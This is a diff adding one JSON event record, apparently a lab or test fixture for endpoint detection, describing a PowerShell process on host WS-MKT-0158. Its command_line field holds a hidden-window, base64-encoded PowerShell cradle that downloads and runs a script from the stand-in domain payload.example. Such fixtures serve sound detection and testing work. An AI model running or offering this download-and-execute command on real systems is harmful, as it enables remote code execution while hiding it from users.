@@ -1,0 +1,9 @@
+{
+  "hostname": "WS-MKT-0158",
+  "user": "LAB\\t.nakamura",
+  "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABvAGEAZAAuAGUAeABhAG0AcABsAGUALwBhAC4AcABzADEAJwApAA==",
+  "parent_process": "C:\\Windows\\System32\\cmd.exe",
+  "remote_ip": "203.0.113.80",
+  "domain": "payload.example"
+}
